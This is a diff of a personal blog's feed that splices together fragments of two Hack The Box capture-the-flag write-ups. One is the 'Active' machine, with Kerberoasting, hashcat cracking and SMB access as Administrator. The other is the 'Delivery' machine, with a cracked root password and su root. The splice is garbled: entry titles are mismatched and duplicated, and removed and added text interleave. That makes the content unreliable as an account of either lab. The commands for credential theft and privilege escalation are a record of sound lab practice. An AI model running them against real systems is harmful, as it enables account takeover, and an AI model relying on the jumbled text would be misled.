-ls
+<p>This confirmed that the channel message was not merely general security advice; it was a practical hint toward the password used by the Mattermost administrator.</p>
+
+<h2 id="7-privilege-escalation-to-root">7. Privilege Escalation to Root</h2>
+
+<p>With the recovered password, I attempted to switch from <code class="language-plaintext highlighter-rouge">maildeliverer</code> to the local Linux <code class="language-plaintext highlighter-rouge">root</code> account.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su root
 </code></pre></div></div>
 
-<p>Download the user flag:</p>
+<p>The authentication succeeded, confirming that the password had been reused for the system’s root account.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get user.txt
+<p>I then retrieved the root flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /root
+cat root.txt
 </code></pre></div></div>
 
-<p>This confirms that the recovered service-account credentials provide access to the share and allow retrieval of the user flag.</p>
+<p><strong>Root obtained.</strong></p>
 
-<p><strong>Important distinction:</strong> Access to a share and possession of a user’s Windows logon session are not necessarily the same thing. SMB share permissions determine which files can be accessed; they do not automatically establish interactive access to the host.</p>
+<h2 id="8-attack-chain-summary">8. Attack Chain Summary</h2>
 
-<h2 id="5-enumerating-kerberoastable-accounts">5. Enumerating Kerberoastable Accounts</h2>
+<p>The complete attack chain was:</p>
 
-<p>With valid domain credentials, enumerate accounts with Service Principal Names (SPNs) and request their service tickets:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetUserSPNs active.htb/svc_tgs -request
-
-Password:
-ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
---------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
-active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 00:36:40.351723  2026-10-22 11:28:56.155407             
-
-
-
-[-] CCache file is not found. Skipping...
-$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$&lt;RDACTED&gt;
-</code></pre></div></div>
-
-<p>The account is also listed as a member of <code class="language-plaintext highlighter-rouge">Group Policy Creator Owners</code>.</p>
-
-<h3 id="why-is-this-interesting">Why is this interesting?</h3>
-
-<p>Kerberos uses Service Principal Names to associate services with accounts. A domain user with sufficient permissions can request a ticket for an SPN without knowing the target account’s password.</p>
-
-<p>When the service runs under a user account, the returned TGS ticket contains encrypted data derived from that account’s secret. An attacker can save the ticket and attempt to crack it offline.</p>
-
-<p>In this case, the SPN belongs to <code class="language-plaintext highlighter-rouge">Administrator</code>, making the ticket especially valuable.</p>
-
-<h2 id="6-cracking-the-administrators-kerberos-ticket">6. Cracking the Administrator’s Kerberos Ticket</h2>
-
-<p>Run Hashcat against the RockYou wordlist:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt
-hashcat (v7.1.2) starting in autodetect mode
-
-OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
-====================================================================================================================================================
-
-
-Dictionary cache hit:
-* Filename..: /usr/share/wordlists/rockyou.txt
-* Passwords.: 14344385
-* Bytes.....: 139921507
-* Keyspace..: 14344385
-
-$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$&lt;REDACTED&gt;:&lt;PASSWORD&gt;
-</code></pre></div></div>
-
-<p>This demonstrates <strong>Kerberoasting</strong>: requesting a service ticket using valid domain credentials and attempting to recover the service account’s password offline.</p>
-
-<p>The attack is possible because the ticket can be requested legitimately, while password guesses are tested locally rather than sent repeatedly to the domain controller.</p>
-
-<h2 id="7-authenticate-as-administrator">7. Authenticate as Administrator</h2>
-
-<p>Test the recovered credentials against the SMB Users share:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient '//10.129.8.52/Users' --user active.htb/Administrator
-Password for [ACTIVE.HTB\Administrator]:
-Try "help" to get a list of possible commands.
-
-smb: \&gt; cd Administrator
-
-smb: \Administrator\&gt; cd Desktop
-
-smb: \Administrator\Desktop\&gt; get root.txt
-
-getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
-</code></pre></div></div>
-
-<hr />
-
-<h2 id="attack-chain-summary">Attack Chain Summary</h2>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Anonymous SMB enumeration
-        |
-        v
-Discover Replication share
-        |
-        v
-Read Groups.xml in SYSVOL-style policy structure
-        |
-        v
-Decrypt GPP cpassword
-        |
-        v
-Recover SVC_TGS credentials
-        |
-        v
-Access Users share and retrieve user.txt
-        |
-        v
-Enumerate SPNs with GetUserSPNs
-        |
-        v
-Request Administrator's TGS ticket
-        |
-        v
-Crack ticket offline with Hashcat
-        |
-        v
-Recover Administrator password
-        |
-        v
-Authenticate to SMB as Administrator
-        |
-        v
-Retrieve root.txt
-</code></pre></div></div>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="active-directory" /><category term="windows" /><category term="Active Directory" /><category term="Kerberoasting" /><category term="SMB Enumeration" /><category term="GPP" /><summary type="html"><![CDATA[HTB Active]]></summary></entry><entry><title type="html">Hack The Box: Forest</title><link href="http://localhost:4000/posts/forest/" rel="alternate" type="text/html" title="Hack The Box: Forest" /><published>2026-10-21T00:00:00+05:30</published><updated>2026-10-21T00:00:00+05:30</updated><id>http://localhost:4000/posts/forest</id><content type="html" xml:base="http://localhost:4000/posts/forest/"><![CDATA[<h1 id="htb-forest">HTB Forest</h1>
+<ol>
+  <li>
+    <p><strong>Enumeration:</strong> Identified SSH, nginx, and Mattermost.</p>
+  </li>
+  <li>
+    <p><strong>Email verification bypass through application chaining:</strong> Used osTicket’s ticket-thread functionality to retrieve a Mattermost verification link.</p>
+  </li>
+  <li>
+    <p><strong>Application access:</strong> Registered and verified a Mattermost account.</p>
+  </li>
+  <li>
+    <p><strong>Credential disclosure:</strong> Found SSH credentials and a password-pattern hint in an internal channel.</p>
+  </li>
+  <li>
+    <p><strong>Initial foothold:</strong> Logged in as <code class="language-plaintext highlighter-rouge">maildeliverer</code> over SSH.</p>
+  </li>
+  <li>
+    <p><strong>Configuration enumeration:</strong> Extracted the Mattermost database credentials from <code class="language-plaintext highlighter-rouge">config.json</code>.</p>
+  </li>
+  <li>
+    <p><strong>Database access:</strong> Retrieved the <code class="language-plaintext highlighter-rouge">root</code> user’s bcrypt password hash.</p>
+  </li>
+  <li>
+    <p><strong>Targeted cracking:</strong> Used a custom wordlist and Hashcat rules to recover <code class="language-plaintext highlighter-rouge">PleaseSubscribe!21</code>.</p>
+  </li>
+  <li>
+    <p><strong>Privilege escalation:</strong> Reused the recovered password with <code class="language-plaintext highlighter-rouge">su root</code>.</p>
+  </li>
+  <li>
+    <p><strong>Objective:</strong> Read <code class="language-plaintext highlighter-rouge">/root/root.txt</code>.</p>
+  </li>
+</ol>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="web" /><category term="linux" /><category term="OS-Ticket" /><category term="Mattermost" /><category term="Password-Reuse" /><summary type="html"><![CDATA[HTB Delivery]]></summary></entry><entry><title type="html">Hack The Box: Forest</title><link href="http://localhost:4000/posts/forest/" rel="alternate" type="text/html" title="Hack The Box: Forest" /><published>2026-10-21T00:00:00+05:30</published><updated>2026-10-21T00:00:00+05:30</updated><id>http://localhost:4000/posts/forest</id><content type="html" xml:base="http://localhost:4000/posts/forest/"><![CDATA[<h1 id="htb-forest">HTB Forest</h1>
 
 <h2 id="overview">Overview</h2>
 
